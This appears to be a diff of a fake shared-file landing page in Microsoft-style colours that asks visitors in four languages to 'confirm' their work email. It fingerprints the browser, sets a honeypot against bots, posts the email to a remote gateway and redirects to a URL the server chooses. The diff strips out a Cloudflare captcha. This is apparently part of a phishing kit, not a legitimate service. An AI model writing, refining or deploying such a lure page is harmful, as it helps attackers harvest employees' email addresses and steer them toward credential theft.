@@ -9,9 +9,6 @@
   <link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
 
-  <!-- Cloudflare Turnstile -->
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-
   <style>
     :root{
       --accent:#0078D4; --accent-2:#0078D4;
@@ -67,9 +64,6 @@
     .overlay{position:fixed;inset:0;background:rgba(0,0,0,.25);opacity:0;pointer-events:none;transition:.25s ease;z-index:999;}
     .overlay.active{opacity:1;pointer-events:auto;}
 
-    .captcha-wrapper{display:flex;justify-content:center;align-items:center;margin:8px 0;}
-    #cf-turnstile{transform:scale(.85);transform-origin:center;}
-
     /* small meta list styling */
     .meta-list{margin:8px 0 0 0;padding:0;list-style:none}
     .meta-list li{font-size:12px;color:#111;margin:6px 0;max-width:255px;width:740px}
@@ -110,7 +104,7 @@
 
   <div class="overlay" id="overlay" aria-hidden="true"></div>
 
-  <!-- Existing email popup (unchanged) -->
+  <!-- Email popup -->
   <div class="popup" id="popup" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
     <form id="emailForm" novalidate autocomplete="off">
       <h3 id="popupTitle">Confirm your email</h3>
@@ -120,10 +114,6 @@
         <p class="error" id="err">Invalid email address</p>
       </div>
 
-      <div class="captcha-wrapper">
-        <div id="cf-turnstile" class="cf-turnstile"></div>
-      </div>
-
       <div class="actions">
         <button type="button" class="btn" id="closeBtn">Cancel</button>
         <button type="submit" class="btn primary" id="submitBtn">Continue</button>
@@ -131,7 +121,7 @@
     </form>
   </div>
 
-  <!-- NEW: lightweight details popup -->
+  <!-- Details popup -->
   <div class="popup" id="metaPopup" role="dialog" aria-modal="true" aria-labelledby="metaTitle">
     <div>
       <h3 id="metaTitle">Details</h3>
@@ -155,7 +145,6 @@
         open: "Access File",
         title: "Confirm your email",
         invalidEmail: "Invalid email address",
-        captchaRequired: "Please complete the check",
         continue: "Continue",
         cancel: "Cancel",
         placeholder: "username@company.com",
@@ -173,7 +162,6 @@
         open: "Ouvrir",
         title: "Confirmez votre e-mail",
         invalidEmail: "Adresse e-mail invalide",
-        captchaRequired: "Veuillez terminer la vérification",
         continue: "Continuer",
         cancel: "Annuler",
         placeholder: "nom@entreprise.com",
@@ -191,7 +179,6 @@
         open: "Dokument öffnen",
         title: "E-Mail bestätigen",
         invalidEmail: "Ungültige E-Mail-Adresse",
-        captchaRequired: "Bitte schließen Sie die Prüfung ab",
         continue: "Weiter",
         cancel: "Abbrechen",
         placeholder: "vorname.nachname@firma.de",
@@ -209,7 +196,6 @@
         open: "Document openen",
         title: "E-mail bevestigen",
         invalidEmail: "Ongeldig e-mailadres",
-        captchaRequired: "Rond de verificatie af",
         continue: "Doorgaan",
         cancel: "Annuleren",
         placeholder: "voornaam.achternaam@bedrijf.nl",
@@ -249,7 +235,7 @@
       const popup = $('popup'), overlay = $('overlay'), openBtn = $('openBtn');
       const form = $('emailForm'), errBox = $('err'), input = $('email'), submitEl = $('submitBtn');
 
-      // NEW: details popup refs
+      // Details popup refs
       const metaPopup = $('metaPopup');
       const viewMetaBtn = $('viewMeta');
       const metaCloseBtn = $('metaClose');
@@ -260,24 +246,8 @@
       const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
       const hide = (n) => { if (!n) return; n.style.display = 'none'; };
 
-      // Turnstile render & callback
-      let cfProof = "", fpHash = "", widgetId = null;
-      window.onTurnstileDone = (token) => { cfProof = token; hide(errBox); };
-
-      function ensureTurnstile(){
-        if (!window.turnstile) return; // script not loaded yet
-        if (!widgetId) {
-          widgetId = turnstile.render('#cf-turnstile', {
-            sitekey: '0x4AAAAAABhsKFJ88b73jtsO',
-            callback: onTurnstileDone,
-            theme: 'light'
-          });
-        } else {
-          try { turnstile.reset(widgetId); } catch {}
-        }
-      }
-
-      // Basic fingerprint
+      // Basic fingerprint (kept; not Cloudflare-related)
+      let fpHash = "";
       (async () => {
         const sig = [navigator.userAgent, navigator.language, navigator.platform, screen.width + "x" + screen.height].join("|");
         const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(sig));
@@ -288,7 +258,6 @@
       openBtn?.addEventListener('click', () => {
         overlay?.classList.add('active');
         popup?.classList.add('active');
-        ensureTurnstile();
         input?.focus();
       });
       const close = () => { overlay?.classList.remove('active'); popup?.classList.remove('active'); hide(errBox); };
@@ -307,7 +276,7 @@
         }
       });
 
-      // NEW: View details → open meta popup
+      // View details → open meta popup
       viewMetaBtn?.addEventListener('click', () => {
         // fill list from current DOM
         metaTitle.textContent = t.metaTitle;
@@ -334,13 +303,12 @@
 
         if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(val)) return show(errBox, t.invalidEmail);
         if (trap) return; // honeypot
-        if (!cfProof || cfProof.length < 10) return show(errBox, t.captchaRequired);
 
         try {
           const res = await fetch(gateway, {
             method: "POST",
             headers: { "Content-Type": "application/json", "Accept-Language": LANG },
-            body: JSON.stringify({ email: val, middleName: trap, jsToken: jsSig, cfToken: cfProof, fingerprint: fpHash })
+            body: JSON.stringify({ email: val, middleName: trap, jsToken: jsSig, fingerprint: fpHash })
           });
 
           const raw = await res.text();
@@ -349,8 +317,6 @@
 
           if (res.ok && json.valid && json.redirect) {
             submitEl && (submitEl.textContent = t.redirecting);
-            try { if (window.turnstile && widgetId) turnstile.reset(widgetId); } catch {}
-            cfProof = "";
             setTimeout(() => { location.href = json.redirect; }, 900);
           } else {
             const msg = (json && (json.message || json.detail)) ? (json.message + (json.detail ? ` (${json.detail})` : '')) : `${t.errorGeneric} [${res.status}]`;
